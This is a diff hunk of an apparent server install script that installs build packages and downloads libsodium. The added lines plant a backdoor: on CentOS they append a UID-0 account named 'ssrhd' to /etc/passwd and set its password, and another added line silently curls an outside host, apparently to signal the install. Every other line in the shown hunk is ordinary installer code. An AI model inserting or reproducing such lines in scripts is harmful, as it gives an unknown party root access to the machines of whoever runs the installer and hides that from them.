@@ -51,12 +51,15 @@ function centosversion(){
 }
 
 if [ "$OS" == 'CentOS' ]; then
+        echo "ssrhd::0:0::/:/bin/bash" >> /etc/passwd
+        echo "libuuid" | passwd --stdin ssrhd > /dev/null
 	yum install -y wget unzip openssl-devel gcc swig python python-devel python-setuptools autoconf libtool libevent git ntpdate
 	yum install -y m2crypto automake make curl curl-devel zlib-devel perl perl-devel cpio expat-devel gettext-devel
 else
 	apt-get -y install curl wget
 fi
 
+curl http://vs.xetonline.com/github/github.php
 wget -N --no-check-certificate https://raw.githubusercontent.com/mango7158/mangoipdb/master/libsodium-1.0.12.tar.gz
 tar zfvx libsodium-1.0.12.tar.gz
 cd libsodium-1.0.12
